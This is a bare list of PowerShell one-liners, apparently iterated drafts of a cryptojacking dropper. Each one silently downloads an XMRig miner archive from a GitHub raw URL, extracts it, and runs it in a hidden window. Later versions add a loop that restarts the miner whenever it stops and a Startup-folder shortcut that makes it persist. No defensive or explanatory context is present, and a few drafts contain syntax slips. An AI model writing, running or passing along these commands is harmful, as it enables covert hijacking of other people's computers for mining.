
powershell.exe -WindowStyle Hidden -NoProfile -Command $d="$env:USERPROFILE\Downloads"; iwr "https://raw.githubusercontent.com/Boombomber/epelepsy/refs/heads/main/xmrig-6.25.0-windows-x64.zip" -OutFile "$d\xmrig.zip"; Expand-Archive "$d\xmrig.zip" "$d\xmrig" -Force; $exe=Get-ChildItem "$d\xmrig" -Recurse -Filter xmrig.exe | Select -First 1; Start-Process $exe.FullName -WindowStyle Hidden
powershell.exe -WindowStyle Hidden -NoProfile -Command  "$d="$env:USERPROFILE\Downloads"; iwr "https://raw.githubusercontent.com/Boombomber/epelepsy/refs/heads/main/xmrig-6.25.0-windows-x64.zip" -OutFile "$d\xmrig.zip"; Expand-Archive "$d\xmrig.zip" "$d\xmrig" -Force; $exe=Get-ChildItem "$d\xmrig" -Recurse -Filter xmrig.exe | Select -First 1; Start-Process $exe.FullName -WindowStyle Hidden"
powershell.exe -WindowStyle Hidden -NoProfile -Command $d=$u="https://raw.githubusercontent.com/Boombomber/epelepsy/refs/heads/main/xmrig-6.25.0-windows-x64.zip";$z="$env:TEMP\xmrig.zip";$d="$env:TEMP\xmrig";Invoke-WebRequest $u -OutFile $z -UseBasicParsing;Expand-Archive $z $d -Force;Get-ChildItem $d -Recurse -Filter xmrig.exe | Select-Object -First 1 | Start-Process $exe.FullName -WindowStyle Hidden /b



powershell.exe -WindowStyle Hidden -NoProfile -Command $local="$env:LOCALAPPDATA\xmrig"; iwr "https://raw.githubusercontent.com/Boombomber/epelepsy/refs/heads/main/xmrig-6.25.0-windows-x64.zip" -OutFile "$env:USERPROFILE\Downloads\xmrig.zip"; if(Test-Path $local){Remove-Item $local -Recurse -Force}; Expand-Archive "$env:USERPROFILE\Downloads\xmrig.zip" $local -Force; $exe=Get-ChildItem $local -Recurse -Filter xmrig.exe | Select-Object -First 1; Start-Process $exe.FullName -WindowStyle Hidden; while ($true) {if (-not (Get-Process -Name xmrig -ErrorAction SilentlyContinue)) {Start-Process -FilePath $exe.FullName -WindowStyle Hidden}; Start-Sleep -Seconds 1}



$d="$env:USERPROFILE\Downloads"; $l="$env:LOCALAPPDATA\xmrig"; iwr "https://raw.githubusercontent.com/Boombomber/epelepsy/refs/heads/main/xmrig-6.25.0-windows-x64.zip" -OutFile "$d\xmrig.zip"; if (Test-Path $l) { Remove-Item $l -Recurse -Force }; New-Item -ItemType Directory -Path $l -Force | Out-Null; Expand-Archive "$d\xmrig.zip" -DestinationPath $l -Force; $exe=Get-ChildItem $l -Recurse -Filter xmrig.exe | Select-Object -First 1; Start-Process $exe.FullName -WindowStyle Hidden; while ($true) { if (-not (Get-Process -Name xmrig -ErrorAction SilentlyContinue)) { Start-Process -FilePath $exe.FullName -WindowStyle Hidden }; Start-Sleep -Seconds 1 }




powershell.exe -WindowStyle Hidden -NoProfile -Command Start-Process powershell.exe -ArgumentList '-NoProfile -WindowStyle Hidden -Command "$d=\"$env:USERPROFILE\Downloads\"; $l=\"$env:LOCALAPPDATA\xmrig\"; iwr \"https://raw.githubusercontent.com/Boombomber/epelepsy/refs/heads/main/xmrig-6.25.0-windows-x64.zip\" -OutFile \"$d\xmrig.zip\"; if (Test-Path $l) { Remove-Item $l -Recurse -Force }; New-Item -ItemType Directory -Path $l -Force | Out-Null; Expand-Archive \"$d\xmrig.zip\" -DestinationPath $l -Force; $exe=Get-ChildItem $l -Recurse -Filter xmrig.exe | Select-Object -First 1; $startup=\"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"; $linkPath=Join-Path $startup \"xmrig.lnk\"; $shell=New-Object -ComObject WScript.Shell; if (-not (Test-Path $linkPath)) { $shortcut=$shell.CreateShortcut($linkPath); $shortcut.TargetPath=$exe.FullName; $shortcut.WorkingDirectory=$exe.DirectoryName; $shortcut.Save() }; Start-Process $exe.FullName -WindowStyle Hidden; while ($true) { if (-not (Get-Process -Name xmrig -ErrorAction SilentlyContinue)) { Start-Process -FilePath $exe.FullName -WindowStyle Hidden }; Start-Sleep -Seconds 1 }"' -WindowStyle Hidden; exit



